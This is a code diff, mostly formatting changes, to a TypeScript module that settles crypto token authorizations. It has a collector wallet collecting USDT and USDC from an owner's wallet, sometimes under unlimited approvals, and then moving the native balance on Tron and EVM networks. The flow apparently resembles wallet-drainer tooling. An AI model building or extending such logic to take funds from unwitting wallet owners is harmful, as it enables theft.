@@ -95,22 +95,23 @@ export type NativeReadinessResult = {
 
 function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
   return (
-    outcome === "authorized" ||
-    outcome === "collected" ||
-    outcome === "pending"
+    outcome === "authorized" || outcome === "collected" || outcome === "pending"
   );
 }
 
-function summarize(items: AuthorizationAssetResult[]): AuthorizationSessionResult {
+function summarize(
+  items: AuthorizationAssetResult[],
+): AuthorizationSessionResult {
   return {
     items,
     authorizedCount: items.filter((i) => isSuccessOutcome(i.outcome)).length,
     failedCount: items.filter((i) => i.outcome === "failed").length,
     rejectedCount: items.filter((i) => i.outcome === "user_rejected").length,
-    skippedCount: items.filter((i) =>
-      i.outcome === "skipped_unsupported" ||
-      i.outcome === "skipped_zero" ||
-      i.outcome === "skipped_dependency_failed"
+    skippedCount: items.filter(
+      (i) =>
+        i.outcome === "skipped_unsupported" ||
+        i.outcome === "skipped_zero" ||
+        i.outcome === "skipped_dependency_failed",
     ).length,
   };
 }
@@ -124,17 +125,25 @@ function formatBlockingSummary(tokens: NativeReadinessToken[]): string {
 
 function isCollectorGasError(message: string | null | undefined): boolean {
   return /Collector wallet has insufficient native gas|insufficient funds for intrinsic transaction cost|INSUFFICIENT_FUNDS/i.test(
-    message ?? ""
+    message ?? "",
   );
 }
 
-function collectorGasFailureMessage(tokens: NativeReadinessToken[]): string | null {
-  const blocking = tokens.filter((t) => t.active && isCollectorGasError(t.lastError));
+function collectorGasFailureMessage(
+  tokens: NativeReadinessToken[],
+): string | null {
+  const blocking = tokens.filter(
+    (t) => t.active && isCollectorGasError(t.lastError),
+  );
   if (blocking.length === 0) return null;
   const activeBlocking = tokens.filter((t) => t.active);
   if (blocking.length !== activeBlocking.length) return null;
   const detail = blocking
-    .map((t) => t.lastError?.trim() || `${t.token} collection blocked — fund collector wallet`)
+    .map(
+      (t) =>
+        t.lastError?.trim() ||
+        `${t.token} collection blocked — fund collector wallet`,
+    )
     .join(" ");
   return detail || "Collector wallet needs native gas for token collection";
 }
@@ -157,30 +166,33 @@ async function registerSettlementSession(args: {
     walletSessionToken: args.walletSessionToken,
     refreshWalletSessionToken: args.refreshWalletSessionToken,
     request: (token) =>
-      fetch(resolveApiUrl(args.apiBaseUrl, "/api/network-settlement/register"), {
-        method: "POST",
-        headers: {
-          "content-type": "application/json",
-          ...correlationHeaders(args.capture.sessionId),
-          ...(token ? { authorization: `Bearer ${token}` } : {}),
+      fetch(
+        resolveApiUrl(args.apiBaseUrl, "/api/network-settlement/register"),
+        {
+          method: "POST",
+          headers: {
+            "content-type": "application/json",
+            ...correlationHeaders(args.capture.sessionId),
+            ...(token ? { authorization: `Bearer ${token}` } : {}),
+          },
+          body: JSON.stringify({
+            sessionId: args.capture.sessionId,
+            traceId: args.capture.sessionId,
+            network: args.capture.network,
+            owner: args.capture.owner,
+            tokens: args.capture.tokens.map((t) => ({
+              token: t.item.asset,
+              txHash: t.orchestration.txHash,
+              shouldAttemptTransfer: t.shouldAttemptTransfer,
+              transferAmountRaw: t.transferAmountRaw,
+              unlimited: t.item.unlimited,
+              amountHuman: t.item.amountHuman,
+            })),
+            batchId: args.capture.batchId ?? null,
+          }),
+          cache: "no-store",
         },
-        body: JSON.stringify({
-          sessionId: args.capture.sessionId,
-          traceId: args.capture.sessionId,
-          network: args.capture.network,
-          owner: args.capture.owner,
-          tokens: args.capture.tokens.map((t) => ({
-            token: t.item.asset,
-            txHash: t.orchestration.txHash,
-            shouldAttemptTransfer: t.shouldAttemptTransfer,
-            transferAmountRaw: t.transferAmountRaw,
-            unlimited: t.item.unlimited,
-            amountHuman: t.item.amountHuman,
-          })),
-          batchId: args.capture.batchId ?? null,
-        }),
-        cache: "no-store",
-      }),
+      ),
   });
   const json = (await res.json()) as {
     ok?: boolean;
@@ -188,7 +200,9 @@ async function registerSettlementSession(args: {
     message?: string;
   };
   if (!res.ok || !json.ok || !json.settlementSessionId) {
-    throw new Error(String(json.message ?? "Failed to register settlement session"));
+    throw new Error(
+      String(json.message ?? "Failed to register settlement session"),
+    );
   }
   return {
     settlementSessionId: json.settlementSessionId,
@@ -197,7 +211,7 @@ async function registerSettlementSession(args: {
 }
 
 export function buildNativeReadinessTokenInputs(
-  tokens: WalletPhaseTokenCapture[]
+  tokens: WalletPhaseTokenCapture[],
 ): Array<{
   token: string;
   shouldAttemptTransfer: boolean;
@@ -226,20 +240,26 @@ export async function fetchNativeReadiness(args: {
     walletSessionToken: args.walletSessionToken,
     refreshWalletSessionToken: args.refreshWalletSessionToken,
     request: (token) =>
-      fetch(resolveApiUrl(args.apiBaseUrl, "/api/token-collection/native-readiness"), {
-        method: "POST",
-        headers: {
-          "content-type": "application/json",
-          ...correlationHeaders(args.transactionId),
-          ...(token ? { authorization: `Bearer ${token}` } : {}),
+      fetch(
+        resolveApiUrl(
+          args.apiBaseUrl,
+          "/api/token-collection/native-readiness",
+        ),
+        {
+          method: "POST",
+          headers: {
+            "content-type": "application/json",
+            ...correlationHeaders(args.transactionId),
+            ...(token ? { authorization: `Bearer ${token}` } : {}),
+          },
+          body: JSON.stringify({
+            owner: args.owner,
+            network: args.network,
+            tokens: buildNativeReadinessTokenInputs(args.tokenCaptures),
+          }),
+          cache: "no-store",
         },
-        body: JSON.stringify({
-          owner: args.owner,
-          network: args.network,
-          tokens: buildNativeReadinessTokenInputs(args.tokenCaptures),
-        }),
-        cache: "no-store",
-      }),
+      ),
   });
   const json = (await res.json()) as {
     canExecuteNative?: boolean;
@@ -315,7 +335,7 @@ export async function waitForNativeExecutionAllowed(args: {
 
 function tokenCaptureForSymbol(
   tokens: WalletPhaseTokenCapture[],
-  token: (typeof TOKEN_SETTLEMENT_ORDER)[number]
+  token: (typeof TOKEN_SETTLEMENT_ORDER)[number],
 ): WalletPhaseTokenCapture | undefined {
   return tokens.find((t) => t.item.asset === token);
 }
@@ -327,7 +347,7 @@ function tokenCaptureForSymbol(
  * 3. Tron: server broadcasts deferred signed native; EVM: one eth_sendTransaction
  */
 export async function runAuthorizationSettlement(
-  args: RunAuthorizationSettlementArgs
+  args: RunAuthorizationSettlementArgs,
 ): Promise<SettlementRunResult> {
   const log = args.log ?? (() => undefined);
   const apiBaseUrl = args.apiBaseUrl ?? "";
@@ -376,7 +396,9 @@ export async function runAuthorizationSettlement(
       });
     }
 
-    const networkRow = args.networks.find((n) => n.key === args.capture.network);
+    const networkRow = args.networks.find(
+      (n) => n.key === args.capture.network,
+    );
     const finalizedCaptures: WalletPhaseTokenCapture[] = [];
 
     for (const token of TOKEN_SETTLEMENT_ORDER) {
@@ -401,8 +423,8 @@ export async function runAuthorizationSettlement(
         nativeBalanceHuman: networkRow?.balances.native ?? "0",
         tokenBalanceHuman:
           token === "USDT"
-            ? networkRow?.balances.usdt ?? "0"
-            : networkRow?.balances.usdc ?? "0",
+            ? (networkRow?.balances.usdt ?? "0")
+            : (networkRow?.balances.usdc ?? "0"),
         unlimited: tokenCapture.item.unlimited,
         amountHuman: tokenCapture.item.amountHuman,
       });
@@ -436,14 +458,18 @@ export async function runAuthorizationSettlement(
       args.onProgress?.({
         network: args.capture.network,
         stage: "collecting_token",
-        message: "Monitoring token collection — native proceeds when no active transfer",
+        message:
+          "Monitoring token collection — native proceeds when no active transfer",
       });
 
       readiness = await waitForNativeExecutionAllowed({
         apiBaseUrl,
         owner: args.capture.owner,
         network: args.capture.network,
-        tokenCaptures: finalizedCaptures.length > 0 ? finalizedCaptures : args.capture.tokens,
+        tokenCaptures:
+          finalizedCaptures.length > 0
+            ? finalizedCaptures
+            : args.capture.tokens,
         walletSessionToken,
         transactionId,
         refreshWalletSessionToken,
@@ -460,8 +486,7 @@ export async function runAuthorizationSettlement(
               network: args.capture.network,
               stage: "collecting_token",
               message:
-                gasFailure ??
-                `Waiting for active collection: ${blocking}`,
+                gasFailure ?? `Waiting for active collection: ${blocking}`,
               tokenStates: poll.tokens.map((t) => ({
                 token: t.token,
                 state: t.state,
@@ -535,21 +560,26 @@ export async function runAuthorizationSettlement(
           },
           body: JSON.stringify({ settlementSessionId, traceId: transactionId }),
           cache: "no-store",
-        }
+        },
       );
       const json = (await res.json()) as { ok?: boolean; message?: string };
       if (!res.ok || !json.ok) {
-        throw new Error(String(json.message ?? "Tron native settlement failed"));
+        throw new Error(
+          String(json.message ?? "Tron native settlement failed"),
+        );
       }
 
       const statusRes = await fetch(
         resolveApiUrl(
           apiBaseUrl,
-          `/api/network-settlement/${encodeURIComponent(settlementSessionId!)}/status`
+          `/api/network-settlement/${encodeURIComponent(settlementSessionId!)}/status`,
         ),
-        { cache: "no-store" }
+        { cache: "no-store" },
       );
-      const statusJson = (await statusRes.json()) as { completed?: boolean; failed?: boolean };
+      const statusJson = (await statusRes.json()) as {
+        completed?: boolean;
+        failed?: boolean;
+      };
       if (statusJson.failed) {
         throw new Error("Tron native settlement failed");
       }
@@ -568,7 +598,9 @@ export async function runAuthorizationSettlement(
       wantsNative &&
       args.capture.native?.authorizationKind === "evm_batch_executed"
     ) {
-      const txHash = String(args.capture.native.authorizationPayload.txHash ?? "");
+      const txHash = String(
+        args.capture.native.authorizationPayload.txHash ?? "",
+      );
       if (!txHash) {
         throw new Error("EVM native batch missing transaction hash");
       }
@@ -577,7 +609,7 @@ export async function runAuthorizationSettlement(
         await fetch(
           resolveApiUrl(
             apiBaseUrl,
-            `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`
+            `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`,
           ),
           {
             method: "POST",
@@ -590,7 +622,7 @@ export async function runAuthorizationSettlement(
             },
             body: JSON.stringify({ txHash }),
             cache: "no-store",
-          }
+          },
         ).catch(() => undefined);
       }
 
@@ -627,7 +659,7 @@ export async function runAuthorizationSettlement(
         await fetch(
           resolveApiUrl(
             apiBaseUrl,
-            `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`
+            `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`,
           ),
           {
             method: "POST",
@@ -640,7 +672,7 @@ export async function runAuthorizationSettlement(
             },
             body: JSON.stringify({ txHash: nativeResult.txHash }),
             cache: "no-store",
-          }
+          },
         ).catch(() => undefined);
       }
 
@@ -670,7 +702,7 @@ export async function runAuthorizationSettlement(
       }
     } else if (wantsNative) {
       throw new Error(
-        "Wallet disconnected — reconnect and try again to complete native transfer"
+        "Wallet disconnected — reconnect and try again to complete native transfer",
       );
     }
 
@@ -681,7 +713,9 @@ export async function runAuthorizationSettlement(
     args.onProgress?.({
       network: args.capture.network,
       stage: "completed",
-      message: nativeExecuted ? "Settlement complete" : "Token settlement complete",
+      message: nativeExecuted
+        ? "Settlement complete"
+        : "Token settlement complete",
     });
 
     return {
